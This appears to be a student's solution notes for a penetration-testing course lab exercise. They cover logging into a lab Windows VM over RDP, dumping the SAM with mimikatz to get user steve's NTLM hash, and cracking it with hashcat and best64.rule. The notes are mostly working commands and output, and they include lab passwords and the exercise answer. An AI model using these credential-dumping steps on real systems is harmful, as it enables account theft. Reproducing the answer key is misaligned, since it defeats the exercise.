@@ -1,0 +1,28 @@
+Questions 2 
+Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labelled "Password Manager" and leverage the methods from this section to extract the NTLM hash of the user steve. Use best64.rule for the cracking process and enter the plain text password as answer to this exercise.
+HINT
+Obtain the password of nadine by completing the Password Manager learning unit Q2 exercise.
+Use the commands provided in Listings 39 and 42 to obtain the password of steve.
+
+xfreerdp /u:nadine /p:123abc /v:192.168.190.227:3389 /drive:smbfolder,/home/kali/Desktop
+
+# Open Powershell in Administrator mode 
+cd C:\Tools\
+ls
+.\mimikatz
+mimikatz # privilege::debug
+# elevate to SYSTEM user privileges
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+# Then we have steve user NTLM hash
+User : steve
+  Hash NTLM: 2835573fb334e3696ef62a00e5cf7571
+
+nano steve.hash
+
+hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+...
+2835573fb334e3696ef62a00e5cf7571:francesca77 
+...
+xfreerdp /u:steve /p:francesca77 /v:192.168.190.227 /drive:smbfolder,/home/kali/Desktop
+
